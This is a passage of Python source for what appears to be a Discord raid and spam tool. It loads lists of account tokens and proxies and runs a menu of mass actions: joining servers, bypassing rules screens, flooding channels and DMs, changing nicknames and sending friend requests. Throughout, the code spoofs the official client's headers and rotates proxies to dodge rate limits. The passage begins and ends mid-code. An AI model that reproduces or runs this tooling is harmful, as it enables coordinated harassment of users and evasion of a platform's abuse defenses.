            self.center = shutil.get_terminal_size().columns
            for token in open("tokens.txt"):
                if token != '':
                    self.tokens.append(
                        token.replace("\n", "").replace('\r\n',
                                                        '').replace('\r', ''))
            print(Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Proxys/No Proxies = [Y/N]' + Fore.RESET, end='')
            resp = input()
            if resp.lower() == 'y':
                for proxy in open("proxies.txt"):
                    if proxy != '':
                        split = proxy.replace("\n", "").replace('\r\n',
                                                        '').replace('\r', '').split(":")
                        if len(split) == 2:
                            self.proxies.append(f"http://{split[0]}:{split[1]}")
                        elif len(split) == 4:
                            self.proxies.append(f"http://{split[2]}:{split[3]}@{split[0]}:{split[1]}")

        async def start(self):
            try:
                await self.rpc.update(state="Main Screen", details="", large_image="default")
            except:
                pass
            clear()
            self.sendText()
            print((Fore.BLUE + '[' + Fore.CYAN + '1' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Server Joiner' + Fore.RESET +
                '             ').center(self.center))
            print((Fore.BLUE + '[' + Fore.CYAN + '2' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Server Leaver' + Fore.RESET +
                '             ').center(self.center))
            print((Fore.BLUE + '[' + Fore.CYAN + '3' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Channel Spammer' + Fore.RESET +
                '            ').center(self.center))
            print((Fore.BLUE + '[' + Fore.CYAN + '4' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Nickname Changer' + Fore.RESET +
                '          ').center(self.center))
            print((Fore.BLUE + '[' + Fore.CYAN + '5' + Fore.BLUE + '] ' +
                Fore.CYAN + 'DM Spammer' + Fore.RESET +
                '                 ').center(self.center))
            print((Fore.BLUE + '[' + Fore.CYAN + '6' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Friend Spammer' + Fore.RESET +
                '            ').center(self.center))
            print((Fore.BLUE + '[' + Fore.CYAN + '7' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Typing Spammer' + Fore.RESET +
                '            ').center(self.center))
            print((Fore.BLUE + '[' + Fore.CYAN + '8' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Bio Changer' + Fore.RESET +
                '                ').center(self.center))
            print((Fore.BLUE + '[' + Fore.CYAN + '9' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Webhook Spammer' + Fore.RESET +
                '            ').center(self.center))
            print((Fore.BLUE + '[' + Fore.CYAN + '10' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Reaction Spammer' + Fore.RESET +
                '          ').center(self.center))
            print((Fore.BLUE + '[' + Fore.CYAN + '11' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Token Checker' + Fore.RESET +
                '             ').center(self.center))
            print((Fore.BLUE + '[' + Fore.CYAN + '12' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Contact & Info' + Fore.RESET +
                '            ').center(self.center))
            print((Fore.BLUE + '[' + Fore.CYAN + '13' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Exit' + Fore.RESET +
                '                     ').center(self.center))
            print(" ")

            async def askChoice():
                print('                                         ' + Fore.BLUE +
                    '[' + Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                    'Your Choice > ' + Fore.RESET + '',
                    end='')
                choice = input()
                if choice.__eq__('1'):
                    await self.screen1()
                elif choice.__eq__('2'):
                    await self.screen2()
                elif choice.__eq__('3'):
                    await self.screen3()
                elif choice.__eq__('4'):
                    await self.screen4()
                elif choice.__eq__('5'):
                    await self.screen5()
                elif choice.__eq__('6'):
                    await self.screen6()
                elif choice.__eq__('7'):
                    await self.screen7()
                elif choice.__eq__('8'):
                    await self.screen8()
                elif choice.__eq__('9'):
                    await self.screen9()
                elif choice.__eq__('10'):
                    await self.screen10()
                elif choice.__eq__('11'):
                    await self.screen11()
                elif choice.__eq__('12'):
                    await self.screen12()
                elif choice.__eq__('13'):
                    print('\n                                       ' + Fore.BLUE +
                        '[' + Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                        "Po")
                    exit()
                else:
                    print('\n                                       ' + Fore.BLUE +
                        '[' + Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                        'Invalid Choice!\n')
                    await askChoice()

            await askChoice()

        async def screen1(self):
            try:
                await self.rpc.update(state="Server Joiner Screen", details="", large_image="default")
            except:
                pass
            clear()
            self.sendText('screen1')
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide guild invite: ',
                end='')
            guildInv = input()
            if guildInv == '0':
                await self.start()
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Do you want to bypass rules screen? [Y/N]: ',
                end='')
            bypassRulesScreen = input()
            if bypassRulesScreen == '0':
                await self.start()
            if bypassRulesScreen.lower() == 'y':
                bypassRulesScreen = True
            else:
                bypassRulesScreen = False
            if 'discord.gg' in guildInv or 'discord.com' in guildInv:
                guildInv = guildInv.replace('https://discord.com/invite/',
                                            '').replace('https://discord.gg/',
                                                        '').replace(
                                                            'discord.gg/', '')
            try:
                await self.rpc.update(state="Using Server Joiner", details="", large_image="default")
            except:
                pass
            async with TaskPool(5_000) as pool:
                for token in self.tokens:
                    await pool.put(self.joinServer(token, guildInv, bypassRulesScreen))
            await asyncio.sleep(5)
            await self.start()

        async def joinServer(self, token, guildInv, bypassRuleScreen = False):
            headers = {
                "Authorization":
                token,
                "accept":
                "*/*",
                "accept-language":
                "en-US",
                "connection":
                "keep-alive",
                "cookie":
                f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
                "DNT":
                "1",
                "origin":
                "https://discord.com",
                "sec-fetch-dest":
                "empty",
                "sec-fetch-mode":
                "cors",
                "sec-fetch-site":
                "same-origin",
                "referer":
                "https://discord.com/channels/@me",
                "TE":
                "Trailers",
                "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
                "X-Super-Properties":
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }

            tk = token
            try:
                tk = token[:25] + "*" * 34
            except:
                tk = "*" * len(token)

            randomProxy = ''
            if self.proxyless == False:
                randomProxy = self.proxies[random.randint(0, len(self.proxies)-1)]

            async with ClientSession(headers=headers) as session:
                try:
                    async with session.post("https://discord.com/api/v9/invites/%s" %
                                            (guildInv), proxy=randomProxy) as req:
                        if req.status == 429:
                            print('\n                                       ' +
                                Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                '] ' + Fore.CYAN + f'{tk} is rate limited!\n' +
                                Fore.RESET)
                        else:
                            try:
                                json = await req.json()
                                if 'message' in json:
                                    if 'verify' in json['message']:
                                        print(
                                            '\n                                       ' +
                                            Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                            '] ' + Fore.CYAN +
                                            f'{tk} is unverified and removed from list!\n'
                                            + Fore.RESET)
                                        if token in self.tokens:
                                            self.tokens.remove(token)
                                    elif 'Unauthorized' in json['message']:
                                        print(
                                            '\n                                       ' +
                                            Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                            '] ' + Fore.CYAN +
                                            f'{tk} is not a real token and removed from list!\n'
                                            + Fore.RESET)
                                        if token in self.tokens:
                                            self.tokens.remove(token)
                                    elif 'banned' in json['message']:
                                        print('\n                                       ' +
                                            Fore.BLUE + '[' + Fore.CYAN + '/' +
                                            Fore.BLUE + '] ' + Fore.CYAN +
                                            f'{tk} is banned from the server!\n' +
                                            Fore.RESET)
                                    elif 'Maximum number of guilds reached' in json[
                                            'message']:
                                        print(
                                            '\n                                       ' +
                                            Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                            '] ' + Fore.CYAN +
                                            f'{tk} has 100 servers and couldn\'t join!\n' +
                                            Fore.RESET)
                                    else:
                                        print('\n                                       ' +
                                            Fore.BLUE + '[' + Fore.CYAN + '/' +
                                            Fore.BLUE + '] ' + Fore.CYAN +
                                            f'{tk} failed to join the server!\n' +
                                            Fore.RESET)
                                else:
                                    json = await req.json()
                                    print('\n                                       ' +
                                        Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                        '] ' + Fore.CYAN + f'{tk} joined the server!\n' +
                                        Fore.RESET)
                                    if bypassRuleScreen == True:
                                        async with session.get("https://discord.com/api/v9/guilds/"+json['guild']['id']+"/member-verification?with_guild=false&invite_code=" + guildInv) as req2:
                                            if req2.status == 200:
                                                j = await req2.json()
                                                async with session.put("https://discord.com/api/v9/guilds/"+json['guild']['id']+"/requests/@me", json=j) as req3:
                                                    if req3.status == 201:
                                                        print('\n                                       ' +
                                                            Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                                            '] ' + Fore.CYAN + f'{tk} bypassed rules screen!\n' +
                                                            Fore.RESET)
                                                    else:
                                                        print('\n                                       ' +
                                                            Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                                            '] ' + Fore.CYAN + f'{tk} failed to bypass rules screen!\n' +
                                                            Fore.RESET)
                                            else:
                                                print('\n                                       ' +
                                                    Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                                    '] ' + Fore.CYAN + f'{tk} failed to bypass rules screen!\n' +
                                                    Fore.RESET)
                            except client_exceptions.ContentTypeError:
                                pass
                except client_exceptions.ClientHttpProxyError:
                    print('\n                                       ' +
                        Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                        '] ' + Fore.CYAN + f'{tk} failed to join the server, Proxy Error!\n' +
                        Fore.RESET)
                    pass
                except client_exceptions.ClientConnectorError:
                    print('\n                                       ' +
                        Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                        '] ' + Fore.CYAN + f'{tk} failed to join the server, Failed to connect to discord.com!\n' +
                        Fore.RESET)
                    pass

        async def screen2(self):
            try:
                await self.rpc.update(state="Server Leaver Screen", details="", large_image="default")
            except:
                pass
            clear()
            self.sendText('screen2')
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide guild id: ',
                end='')
            guildId = input()
            if guildId == '0':
                await self.start()
            try:
                await self.rpc.update(state="Using Server Leaver", details="", large_image="default")
            except:
                pass
            async with TaskPool(5_000) as pool:
                for token in self.tokens:
                    await pool.put(self.leaveServer(token, guildId))
            await asyncio.sleep(5)
            await self.start()

        async def leaveServer(self, token, guildId):
            headers = {
                "Authorization":
                token,
                "accept":
                "*/*",
                "accept-language":
                "en-US",
                "connection":
                "keep-alive",
                "cookie":
                f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
                "DNT":
                "1",
                "origin":
                "https://discord.com",
                "sec-fetch-dest":
                "empty",
                "sec-fetch-mode":
                "cors",
                "sec-fetch-site":
                "same-origin",
                "referer":
                "https://discord.com/channels/@me",
                "TE":
                "Trailers",
                "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
                "X-Super-Properties":
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }

            tk = token
            try:
                tk = token[:25] + "*" * 34
            except:
                tk = "*" * len(token)

            randomProxy = ''
            if self.proxyless == False:
                randomProxy = self.proxies[random.randint(0, len(self.proxies)-1)]

            async with ClientSession(headers=headers) as session:
                async with session.delete(
                        "https://discord.com/api/v9/users/@me/guilds/%s" %
                    (guildId), proxy=randomProxy) as req:
                    if req.status == 429:
                        print('\n                                       ' +
                            Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                            '] ' + Fore.CYAN + f'{tk} is rate limited!\n' +
                            Fore.RESET)
                    elif req.status == 204:
                        print('\n                                       ' +
                            Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                            '] ' + Fore.CYAN + f'{tk} left the server!\n' +
                            Fore.RESET)
                    else:
                        json = await req.json()
                        if 'message' in json:
                            if 'verify' in json['message']:
                                print(
                                    '\n                                       ' +
                                    Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                    '] ' + Fore.CYAN +
                                    f'{tk} is unverified and removed from list!\n'
                                    + Fore.RESET)
                                if token in self.tokens:
                                    self.tokens.remove(token)
                            elif 'Unauthorized' in json['message']:
                                print(
                                    '\n                                       ' +
                                    Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                    '] ' + Fore.CYAN +
                                    f'{tk} is not a real token and removed from list!\n'
                                    + Fore.RESET)
                                if token in self.tokens:
                                    self.tokens.remove(token)
                            elif 'Unknown Guild' in json['message']:
                                pass
                            else:
                                print('\n                                       ' +
                                    Fore.BLUE + '[' + Fore.CYAN + '/' +
                                    Fore.BLUE + '] ' + Fore.CYAN +
                                    f'{tk} failed to leave the server!\n' +
                                    Fore.RESET)

        async def screen3(self):
            try:
                await self.rpc.update(state="Channel Spammer Screen", details="", large_image="default")
            except:
                pass
            clear()
            self.sendText('screen3')
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide channel id: ',
                end='')
            chId = input()
            if chId == '0':
                await self.start()
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide message: ',
                end='')
            msg = input()
            if msg == '0':
                await self.start()
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN + 'Amount: ',
                end='')
            amount = input()
            if amount == '0':
                await self.start()
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'You want to reply to a message? [Y/N]: ',
                end='')
            replyQues = input()
            replyMsg = None
            if replyQues.lower() == 'y':
                print('\n                                       ' + Fore.BLUE +
                    '[' + Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                    'Please provide reply message id: ',
                    end='')
                replyMsg = input()
            try:
                await self.rpc.update(state="Using Channel Spammer", details="", large_image="default")
            except:
                pass
            async with TaskPool(5_000) as pool:
                for token in self.tokens:
                    await pool.put(
                        self.channelSpammer(token, chId, msg, amount, replyMsg))
            await asyncio.sleep(5)
            await self.start()

        async def channelSpammer(self,
                                token,
                                chId,
                                msg,
                                amount="1",
                                replyMsg=None):
            headers = {
                "Authorization":
                token,
                "accept":
                "*/*",
                "accept-language":
                "en-US",
                "connection":
                "keep-alive",
                "cookie":
                f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
                "DNT":
                "1",
                "origin":
                "https://discord.com",
                "sec-fetch-dest":
                "empty",
                "sec-fetch-mode":
                "cors",
                "sec-fetch-site":
                "same-origin",
                "referer":
                "https://discord.com/channels/@me",
                "TE":
                "Trailers",
                "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
                "X-Super-Properties":
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }

            tk = token
            try:
                tk = token[:25] + "*" * 34
            except:
                tk = "*" * len(token)
            j = {"content": msg}
            if replyMsg != None:
                j['message_reference'] = {
                    "channel_id": chId,
                    "message_id": replyMsg
                }
            for i in range(int(amount)):

                randomProxy = ''
                if self.proxyless == False:
                    randomProxy = self.proxies[random.randint(0, len(self.proxies)-1)]

                async with ClientSession(headers=headers) as session:
                    async with session.post(
                            "https://discord.com/api/v9/channels/%s/messages" %
                        (chId),
                            json=j, proxy=randomProxy) as req:
                        if req.status == 429:
                            print('\n                                       ' +
                                Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                '] ' + Fore.CYAN + f'{tk} is rate limited!\n' +
                                Fore.RESET)
                        elif req.status == 200:
                            print('\n                                       ' +
                                Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                '] ' + Fore.CYAN + f'{tk} sent message!\n' +
                                Fore.RESET)
                        else:
                            json = await req.json()
                            if 'message' in json:
                                if 'verify' in json['message']:
                                    print(
                                        '\n                                       '
                                        + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                        Fore.BLUE + '] ' + Fore.CYAN +
                                        f'{tk} is unverified and removed from list!\n'
                                        + Fore.RESET)
                                    if token in self.tokens:
                                        self.tokens.remove(token)
                                elif 'Unauthorized' in json['message']:
                                    print(
                                        '\n                                       '
                                        + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                        Fore.BLUE + '] ' + Fore.CYAN +
                                        f'{tk} is not a real token and removed from list!\n'
                                        + Fore.RESET)
                                    if token in self.tokens:
                                        self.tokens.remove(token)
                                elif 'Missing Access' in json['message']:
                                    pass
                                else:
                                    print(
                                        '\n                                       '
                                        + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                        Fore.BLUE + '] ' + Fore.CYAN +
                                        f'{tk} failed to send message!\n' +
                                        Fore.RESET)

        async def screen4(self):
            try:
                await self.rpc.update(state="Nickname Changer Screen", details="", large_image="default")
            except:
                pass
            clear()
            self.sendText('screen4')
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide guild id: ',
                end='')
            guildId = input()
            if guildId == '0':
                await self.start()
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide new nickname: ',
                end='')
            nick = input()
            if nick == '0':
                await self.start()
            try:
                await self.rpc.update(state="Using Nickname Changer", details="", large_image="default")
            except:
                pass
            async with TaskPool(5_000) as pool:
                for token in self.tokens:
                    await pool.put(self.nicknameChanger(token, guildId, nick))
            await asyncio.sleep(5)
            await self.start()

        async def nicknameChanger(self, token, guildId, nick):
            headers = {
                "Authorization":
                token,
                "accept":
                "*/*",
                "accept-language":
                "en-US",
                "connection":
                "keep-alive",
                "cookie":
                f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
                "DNT":
                "1",
                "origin":
                "https://discord.com",
                "sec-fetch-dest":
                "empty",
                "sec-fetch-mode":
                "cors",
                "sec-fetch-site":
                "same-origin",
                "referer":
                "https://discord.com/channels/@me",
                "TE":
                "Trailers",
                "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
                "X-Super-Properties":
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }

            tk = token
            try:
                tk = token[:25] + "*" * 34
            except:
                tk = "*" * len(token)

            randomProxy = ''
            if self.proxyless == False:
                randomProxy = self.proxies[random.randint(0, len(self.proxies)-1)]

            async with ClientSession(headers=headers) as session:
                async with session.patch(
                        "https://discord.com/api/v9/guilds/%s/members/@me/nick" %
                    (guildId),
                        json={"nick": nick}, proxy=randomProxy) as req:
                    if req.status == 429:
                        print('\n                                       ' +
                            Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                            '] ' + Fore.CYAN + f'{tk} is rate limited!\n' +
                            Fore.RESET)
                    elif req.status == 200:
                        print('\n                                       ' +
                            Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                            '] ' + Fore.CYAN + f'{tk} changed nickname!\n' +
                            Fore.RESET)
                    else:
                        json = await req.json()
                        if 'message' in json:
                            if 'verify' in json['message']:
                                print(
                                    '\n                                       ' +
                                    Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                    '] ' + Fore.CYAN +
                                    f'{tk} is unverified and removed from list!\n'
                                    + Fore.RESET)
                                if token in self.tokens:
                                    self.tokens.remove(token)
                            elif 'Unauthorized' in json['message']:
                                print(
                                    '\n                                       ' +
                                    Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                    '] ' + Fore.CYAN +
                                    f'{tk} is not a real token and removed from list!\n'
                                    + Fore.RESET)
                                if token in self.tokens:
                                    self.tokens.remove(token)
                            elif 'Unknown Guild' in json['message']:
                                pass
                            else:
                                print('\n                                       ' +
                                    Fore.BLUE + '[' + Fore.CYAN + '/' +
                                    Fore.BLUE + '] ' + Fore.CYAN +
                                    f'{tk} failed to nick!\n' + Fore.RESET)

        async def screen5(self):
            try:
                await self.rpc.update(state="DM Spammer Screen", details="", large_image="default")
            except:
                pass
            clear()
            self.sendText('screen5')
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide user id: ',
                end='')
            userId = input()
            if userId == '0':
                await self.start()
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide message: ',
                end='')
            msg = input()
            if msg == '0':
                await self.start()
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN + 'Amount: ',
                end='')
            amount = input()
            if amount == '0':
                await self.start()
            try:
                await self.rpc.update(state="Using DM Spammer", details="", large_image="default")
            except:
                pass
            async with TaskPool(5_000) as pool:
                for token in self.tokens:
                    await pool.put(self.dmSpammer(token, userId, msg, amount))
            await asyncio.sleep(5)
            await self.start()

        async def dmSpammer(self, token, userId, msg, amount="1"):
            headers = {
                "Authorization":
                token,
                "accept":
                "*/*",
                "accept-language":
                "en-US",
                "connection":
                "keep-alive",
                "cookie":
                f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
                "DNT":
                "1",
                "origin":
                "https://discord.com",
                "sec-fetch-dest":
                "empty",
                "sec-fetch-mode":
                "cors",
                "sec-fetch-site":
                "same-origin",
                "referer":
                "https://discord.com/channels/@me",
                "TE":
                "Trailers",
                "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
                "X-Super-Properties":
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }
            tk = token
            try:
                tk = token[:25] + "*" * 34
            except:
                tk = "*" * len(token)

            async with ClientSession(headers=headers) as session:
                for i in range(int(amount)):

                    randomProxy = ''
                    if self.proxyless == False:
                        randomProxy = self.proxies[random.randint(0, len(self.proxies)-1)]

                    async with session.post(
                            "https://discord.com/api/v9/users/@me/channels",
                            json={"recipient_id": userId}, proxy=randomProxy) as r:
                        if r.status == 200:
                            json = await r.json()
                            id = json["id"]
                            async with session.post(
                                    "https://discord.com/api/v9/channels/%s/messages"
                                    % (id),
                                    json={"content": msg}) as r:
                                text = await r.text()
                                if "content" in text:
                                    print(
                                        '\n                                       '
                                        + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                        Fore.BLUE + '] ' + Fore.CYAN +
                                        f'{tk} successfully sent message!\n' +
                                        Fore.RESET)
                                elif "You need to verify your account" in text:
                                    print(
                                        '\n                                       '
                                        + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                        Fore.BLUE + '] ' + Fore.CYAN +
                                        f'{tk} is unverified and removed from list!\n'
                                        + Fore.RESET)
                                    if token in self.tokens:
                                        self.tokens.remove(token)
                                elif "Unauthorized" in text:
                                    print(
                                        '\n                                       '
                                        + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                        Fore.BLUE + '] ' + Fore.CYAN +
                                        f'{tk} is invalid and removed from list!\n'
                                        + Fore.RESET)
                                    if token in self.tokens:
                                        self.tokens.remove(token)
                                else:
                                    print(
                                        '\n                                       '
                                        + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                        Fore.BLUE + '] ' + Fore.CYAN +
                                        f'{tk} failed to send message!\n' +
                                        Fore.RESET)
                        else:
                            print('\n                                       ' +
                                Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE +
                                '] ' + Fore.CYAN +
                                f'{tk} failed to send message!\n' + Fore.RESET)

        async def screen6(self):
            try:
                await self.rpc.update(state="Friend Spammer Screen", details="", large_image="default")
            except:
                pass
            clear()
            self.sendText('screen6')
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide the type [a = add/r = remove]: ',
                end='')
            type = input()
            if type == '0':
                await self.start()
            if type == 'a' or type == 'add':
                type = 'add'
                print('\n                                       ' + Fore.BLUE + '[' +
                    Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                    'Please provide user tag: ',
                    end='')
                userTag = input()
                if userTag == '0':
                    await self.start()
                try:
                    await self.rpc.update(state="Using Friend Spammer", details="", large_image="default")
                except:
                    pass
                async with TaskPool(5_000) as pool:
                    for token in self.tokens:
                        await pool.put(self.friendSpammer(token, userTag, type))
                await asyncio.sleep(5)
                await self.start()
            elif type == 'r' or type == 'remove':
                type = 'remove'
                print('\n                                       ' + Fore.BLUE + '[' +
                    Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                    'Please provide user id: ',
                    end='')
                userId = input()
                if userId == '0':
                    await self.start()
                try:
                    await self.rpc.update(state="Using Friend Spammer", details="", large_image="default")
                except:
                    pass
                async with TaskPool(5_000) as pool:
                    for token in self.tokens:
                        await pool.put(self.friendSpammer(token, userId, type))
                await asyncio.sleep(5)
                await self.start()

        async def friendSpammer(self, token, userTag_Or_id, type = 'add'):
            if type == 'add':
                userName = userTag_Or_id.split('#')[0]
                userDiscrim = userTag_Or_id.split('#')[1]
                headers = {
                    "Authorization":
                    token,
                    "accept":
                    "*/*",
                    "accept-language":
                    "en-US",
                    "connection":
                    "keep-alive",
                    "cookie":
                    f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
                    "DNT":
                    "1",
                    "origin":
                    "https://discord.com",
                    "sec-fetch-dest":
                    "empty",
                    "sec-fetch-mode":
                    "cors",
                    "sec-fetch-site":
                    "same-origin",
                    "referer":
                    "https://discord.com/channels/@me",
                    "TE":
                    "Trailers",
                    "User-Agent":
                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
                    "X-Super-Properties":
                    "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                }
                tk = token
                try:
                    tk = token[:25] + "*" * 34
                except:
